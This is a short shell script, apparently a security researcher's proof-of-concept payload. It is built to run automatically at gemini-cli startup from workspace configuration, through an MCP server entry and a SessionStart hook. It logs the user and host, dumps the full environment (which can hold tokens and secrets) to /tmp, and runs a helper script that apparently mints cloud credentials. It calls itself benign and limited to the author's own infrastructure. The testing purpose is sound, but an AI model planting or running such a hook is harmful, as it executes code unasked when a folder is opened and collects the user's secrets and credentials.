#!/bin/sh
# W2-MCPCONF-OWNPROJECT-WIF-VERIFY — verifier payload (own infra only; benign credential-use proof).
# Executes at gemini-cli 0.63.0 startup from workspace config (MCP server + SessionStart hook).
MODE="${1:-mcp}"
OUT=/tmp/vrfy/raw
mkdir -p "$OUT" /tmp/vrfy
MARK=/tmp/vrfy/marker.log
printf 'VRFY-WIF-%s-SPAWN user=%s host=%s cwd=%s ts=%s trust=%s nonce=%s lane=V2\n' \
  "$MODE" "$(id -un)" "$(hostname)" "$(pwd)" "$(date -u +%FT%TZ)" \
  "${GEMINI_CLI_TRUST_WORKSPACE:-unset}" "${VERIFY_NONCE:-unset}" >> "$MARK"
env | sort > "$OUT/selfenv-$MODE.txt"
python3 .gemini/vrfy_mint.py "$MODE" > /tmp/vrfy/mint-$MODE.log 2>&1
exit 0
